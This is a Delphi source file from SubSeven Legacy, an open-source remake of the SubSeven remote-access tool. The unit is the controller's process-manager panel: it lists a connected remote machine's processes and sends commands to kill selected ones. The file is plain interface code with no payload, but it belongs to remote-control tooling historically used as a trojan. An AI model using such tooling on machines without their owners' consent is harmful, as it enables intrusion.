{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit uFrameProcess;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, ___S7DockFrame, S7DockCaption,
  VirtualTrees, S7Panel, Sub7.Viewer.VCL.Button, XSuperObject, Sub7.Core.Windows.Process.Enum, Sub7.Core.Types,
  Sub7.Core.Protocol;

type
  TTreeData = record
    Info : TS7ProcessInformation;
    User : String;
  end;
  PTreeData = ^TTreeData;

  TFrameProcess = class(TS7FrameDock)
    VST: TVirtualStringTree;
    PanelFooter: TS7Panel;
    ButtonRefresh: TS7Button;
    ButtonKillSelected: TS7Button;
    procedure ButtonRefreshClick(Sender: TObject);
    procedure VSTChange(Sender: TBaseVirtualTree; Node: PVirtualNode);
    procedure VSTFocusChanged(Sender: TBaseVirtualTree; Node: PVirtualNode;
      Column: TColumnIndex);
    procedure VSTFreeNode(Sender: TBaseVirtualTree; Node: PVirtualNode);
    procedure VSTGetText(Sender: TBaseVirtualTree; Node: PVirtualNode;
      Column: TColumnIndex; TextType: TVSTTextType; var CellText: string);
    procedure VSTGetNodeDataSize(Sender: TBaseVirtualTree;
      var NodeDataSize: Integer);
    procedure VSTCompareNodes(Sender: TBaseVirtualTree; Node1,
      Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
    procedure ButtonKillSelectedClick(Sender: TObject);
    procedure VSTAddToSelection(Sender: TBaseVirtualTree; Node: PVirtualNode);
    procedure VSTRemoveFromSelection(Sender: TBaseVirtualTree;
      Node: PVirtualNode);
  private
    {@M}
    function GetSelectedProcess() : ISuperObject;
    procedure KillSelectedProcess();
    procedure OnSelectionUpdate();
    procedure RenderProcess(const AData : ISuperObject);
    procedure RenderKilledProcess(const AData : ISuperObject);
    function GetNodeByProcessId(const AProcessId : Cardinal) : PVirtualNode;
  protected
    {@M}
    procedure DoResize(); override;
    procedure OnConnectionStateUpdated(const AConnected : Boolean); override;
  public
    {@M}
    procedure Render(const ACommand : TS7Command; const AData : ISuperObject); override;
  end;

implementation

{$R *.dfm}

uses uFormMain, Sub7.Core.Utils, System.Math, uFormExceptions, Sub7.Core.Exceptions;

function TFrameProcess.GetNodeByProcessId(const AProcessId : Cardinal) : PVirtualNode;
var ANode : PVirtualNode;
    pData : PTreeData;
begin
  result := nil;
  ///

  for ANode in VST.Nodes do begin
    pData := ANode.GetData;

    if pData^.Info.ProcessId = AProcessId then begin
      result := ANode;

      break;
    end;
  end;
end;

procedure TFrameProcess.Render(const ACommand : TS7Command; const AData : ISuperObject);
begin
  case ACommand of
    mhcProcessList      : self.RenderProcess(AData);
    mhcTerminateProcess : self.RenderKilledProcess(AData);
  end;
end;

procedure TFrameProcess.RenderKilledProcess(const AData : ISuperObject);
var ASuccess    : ISuperArray;
    AFailed     : ISuperArray;
    I           : Integer;
    ANode       : PVirtualNode;
    ABuilder    : TStringBuilder;
    AFailedItem : ISuperObject;
    AErrLine    : String;
    APID        : Integer;
    AReason     : String;
begin
  if not Assigned(AData) then
    Exit();
  ///

  ASuccess := nil;
  AFailed  := nil;

  if AData.Contains('success') then
    ASuccess := AData.A['success'];

  if AData.Contains('failed') then
    AFailed := AData.A['failed'];
  ///

  {
    Manage Success Nodes
  }
  if Assigned(ASuccess) then begin
    VST.BeginUpdate();
    try
      for I := 0 to ASuccess.Length -1 do begin
        ANode := GetNodeByProcessId(ASuccess.I[I]);

        VST.DeleteNode(ANode);
      end;
    finally
      VST.EndUpdate();
    end;
  end;

  {
    Manage Failed Nodes
  }
  if Assigned(AFailed) then begin
    ABuilder := TStringBuilder.Create();
    try
      for I := 0 to AFailed.Length -1 do begin
        AFailedItem := AFailed.O[I];
        ///

        if (not AFailedItem.Contains('pid')) or
            (not AFailedItem.Contains('reason')) then
              continue;

        APID    := AFailedItem.I['pid'];
        AReason := AFailedItem.S['reason'];

        if AFailedItem.Contains('name') then
          AErrLine := Format('%s(%d)', [AFailedItem.S['name'], APID])
        else
          AErrLine := Format('%d', [APID]);

        ABuilder.Append(Format('* %s%s', [AErrLine, #13#10]));

        ///
        FormExceptions.AddItem(ES7ServerException.Create(AReason), True {Silent});
      end;

      { Spawn Message }
      FormMain.MessageBox.MessageBox(
          self.GetOwnerForm(),
          Format('Could not kill bellow process:%s%s', [#13#10, ABuilder.ToString()]),
          'Kill Process',
          MB_ICONERROR
      );
    finally
      if Assigned(ABuilder) then
        FreeAndNil(ABuilder);
    end;
  end;
end;

procedure TFrameProcess.OnSelectionUpdate();
begin
  if Assigned(ButtonKillSelected) then
    self.ButtonKillSelected.Enabled := (VST.SelectedCount > 0);
end;

function TFrameProcess.GetSelectedProcess() : ISuperObject;
var ANode    : PVirtualNode;
    pData    : PTreeData;
    AProcess : ISuperArray;
begin
  result := nil;
  AProcess := nil;
  ///

  for ANode in VST.SelectedNodes do begin
    pData := ANode.GetData;
    ///

    if not Assigned(AProcess) then
      AProcess := TSuperArray.Create();

    AProcess.Add(pData^.Info.ProcessId);
  end;

  if Assigned(AProcess) then begin
    result := TSuperObject.Create();

    result.A['process'] := AProcess;
  end;
end;

procedure TFrameProcess.KillSelectedProcess();
var AData : ISuperObject;
begin
  AData := self.GetSelectedProcess();

  if not Assigned(AData) then
    Exit();
  ///

  if FormMain.MessageBox.MessageBox(GetOwnerForm(), Format('You are about to kill %d process. Are you sure?', [VST.SelectedCount]), 'delete file(s)/folder(s)', MB_ICONQUESTION + MB_YESNO) = ID_NO then
    Exit();

  ///
  FormMain.Session.SendCommand(mhcTerminateProcess, AData);
end;

procedure TFrameProcess.OnConnectionStateUpdated(const AConnected : Boolean);
begin
  VST.Clear();
  ///

  ButtonRefresh.Enabled      := AConnected;
  VST.Enabled                := AConnected;
  ButtonKillSelected.Enabled := False;
end;

procedure TFrameProcess.RenderProcess(const AData : ISuperObject);
var ANode               : PVirtualNode;
    pData               : PTreeData;
    AEnumProcess        : TS7EnumProcess;
    AProcessInformation : TS7ProcessInformation;
begin
  VST.Clear();
  ///

  if not Assigned(AData) then
    Exit();
  ///

  AEnumProcess := TS7EnumProcess.Create(False, False);
  try
    AEnumProcess.DeSerialize(AData);
    ///

    VST.BeginUpdate();
    try
      for AProcessInformation in AEnumProcess.Items do begin
        ANode := VST.AddChild(nil);

        pData := ANode.GetData;

        pData^.Info := AProcessInformation;
        pData^.User := Format('%s/%s', [
          FillFree(pData^.Info.User),
          FillFree(pData^.Info.Domain)
        ]);
      end;
    finally
      VST.EndUpdate();
    end;
  finally
    if Assigned(AEnumProcess) then
      FreeAndNil(AEnumProcess);
  end;
end;

procedure TFrameProcess.VSTAddToSelection(Sender: TBaseVirtualTree;
  Node: PVirtualNode);
begin
  self.OnSelectionUpdate();
end;

procedure TFrameProcess.VSTChange(Sender: TBaseVirtualTree; Node: PVirtualNode);
begin
  VST.Refresh();
end;

procedure TFrameProcess.VSTCompareNodes(Sender: TBaseVirtualTree; Node1,
  Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
  var pData1, pData2 : PTreeData;
begin
  pData1 := VST.GetNodeData(Node1);
  pData2 := VST.GetNodeData(Node2);
  ///

  if not Assigned(pData1) or not Assigned(pData2) then
    Exit();

  case column of
    0 : begin
      {
        String
      }
      result := CompareText(
        ExtractFileName(pData1^.Info.ImagePath),
        ExtractFileName(pData2^.Info.ImagePath)
      );
    end;

    1 : begin
      {
        Int
      }
      result := CompareValue(pData1^.Info.ProcessId, pData2^.Info.ProcessId);
    end;

    2 : begin
      {
        String
      }
      result := CompareText(pData1^.User, pData2^.User);
    end;

    3 : begin
      {
        String
      }
      result := CompareText(pData1^.Info.ImagePath, pData2^.Info.ImagePath);
    end;
  end;
end;

procedure TFrameProcess.VSTFocusChanged(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Column: TColumnIndex);
begin
  VST.Refresh();
end;

procedure TFrameProcess.VSTFreeNode(Sender: TBaseVirtualTree;
  Node: PVirtualNode);
  var pData : PTreeData;
begin
  pData := Node.GetData;

  if Assigned(pData^.Info) then
    FreeAndNil(pData^.Info);
end;

procedure TFrameProcess.VSTGetNodeDataSize(Sender: TBaseVirtualTree;
  var NodeDataSize: Integer);
begin
  NodeDataSize := SizeOf(TTreeData);
end;

procedure TFrameProcess.VSTGetText(Sender: TBaseVirtualTree; Node: PVirtualNode;
  Column: TColumnIndex; TextType: TVSTTextType; var CellText: string);
  var pData: PTreeData;
begin
  pData := Node.GetData;

  case Column of
    0 : begin
      CellText := ExtractFileName(pData^.Info.ImagePath);
    end;

    1 : begin
      CellText := IntToStr(pData^.Info.ProcessId);
    end;

    2 : begin
      CellText := pData^.User;
    end;

    3 : begin
      CellText := pData^.Info.ImagePath;
    end;
  end;
end;

procedure TFrameProcess.VSTRemoveFromSelection(Sender: TBaseVirtualTree;
  Node: PVirtualNode);
begin
  self.OnSelectionUpdate();
end;

procedure TFrameProcess.ButtonKillSelectedClick(Sender: TObject);
begin
  self.KillSelectedProcess();
end;

procedure TFrameProcess.ButtonRefreshClick(Sender: TObject);
begin
  if not FormMain.CheckConnected() then
    Exit();
  ///

  FormMain.Session.SendCommand(mhcProcessList);
end;

procedure TFrameProcess.DoResize();
begin
  ButtonRefresh.Left      := (PanelFooter.Width div 2) - ButtonRefresh.Width - 4;
  ButtonKillSelected.Left := (PanelFooter.Width div 2) + 4;

  ButtonRefresh.Top      := (PanelFooter.Height div 2) - (ButtonRefresh.Height div 2);
  ButtonKillSelected.Top := ButtonRefresh.Top;
end;

end.
